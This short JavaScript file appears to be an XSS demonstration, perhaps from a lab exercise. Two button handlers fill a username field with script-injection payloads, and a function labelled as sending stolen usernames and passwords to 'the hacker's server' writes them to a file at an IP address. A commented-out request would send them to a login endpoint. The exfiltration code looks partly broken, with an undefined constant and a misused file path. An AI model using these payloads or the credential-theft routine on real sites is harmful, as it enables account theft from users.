document.getElementById("xss1").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "?user='/><script>alert('This page is vulnerable to XSS!');</script>";
});

document.getElementById("xss3").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "><script>alert(':(');</script>";
	document.getElementById('PasswordInput').value = "aaAA22@@";
});

// send the stolen usernames and passwords to the hacker's server
function xss(uname, pword){
	var filestream = new ActiveXObject("Scripting.FileSystemObject");
	var file = filestream.OpenTextFile("192.168.1.110/hacker_info.txt", ForWriting, true);
	file.Write(uname, pword);
	file.Close();
	alert("Thanks for the info!");
	return;
	//var stolen_info = new XMLHttpRequest();
	//stolen_info.open('GET', '/login_xss?username='+uname+'&password='+pword);
	//stolen_info.send();
}
